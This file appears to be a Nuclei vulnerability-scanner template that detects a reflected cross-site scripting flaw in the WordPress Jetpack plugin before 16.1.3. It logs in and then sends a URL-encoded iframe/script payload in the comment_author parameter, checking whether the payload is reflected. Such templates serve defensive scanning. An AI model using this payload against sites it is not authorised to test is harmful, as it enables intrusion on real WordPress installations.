id: jetpack-reader-xss

info:
  name: WordPress Jetpack <16.1.3 - Reflected Cross-Site Scripting
  author: kosoyyagent
  severity: high
  description: |
    WordPress Jetpack plugin before 16.1.3 contains a reflected cross-site scripting vulnerability. The plugin does not sanitize the comment_author parameter before outputting it in the Reader editor.
  reference:
    - https://jetpack.com/resources/jetpack-16-1-3-critical-security-update/
    - https://wordpress.org/plugins/jetpack/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  metadata:
    max-request: 2
  tags: xss,jetpack,wordpress,wp-plugin,authenticated,intrusive,vuln

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      - |
        GET /wp-admin/post-new.php?url=https%3A%2F%2Fwp.com%2Fsource&comment_content=safe&comment_author=%3Ciframe%20srcdoc%3D%22%3Cscript%3Etop.alert%28%27{{randstr}}%27%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "top.alert('{{randstr}}')"

      - type: word
        part: header
        words:
          - text/html
